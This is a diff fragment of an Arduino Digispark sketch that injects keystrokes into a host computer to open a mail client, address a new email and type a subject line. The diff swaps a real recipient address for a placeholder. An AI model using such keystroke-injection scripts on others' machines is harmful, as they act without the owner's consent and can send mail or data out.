@@ -64,7 +64,7 @@ void loop() {
   }
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   //DigiKeyboard.delay(1800);
-  DigiKeyboard.println("ndtptb@mail.missouri.edu");       // I send the email to our group email, but you can put anything here
+  DigiKeyboard.println("Enter Email Here");       // I send the email to our group email, but you can put anything here
   DigiKeyboard.sendKeyStroke(KEY_TAB);
   DigiKeyboard.sendKeyStroke(KEY_TAB);
   DigiKeyboard.println("I Love Unicorns");                // Subject line
@@ -94,7 +94,7 @@ void loop() {
     DigiKeyboard.delay(2000);
     DigiKeyboard.sendKeyStroke(KEY_N, MOD_GUI_LEFT);    // Creating New Email
     DigiKeyboard.delay(2000);
-    DigiKeyboard.println("ndtptb@mail.missouri.edu");             // I send the email to our group email, but you can put anything here
+    DigiKeyboard.println("Enter Email Here");             // I send the email to our group email, but you can put anything here
     DigiKeyboard.delay(2000);
     DigiKeyboard.sendKeyStroke(KEY_TAB);
     DigiKeyboard.delay(2000);
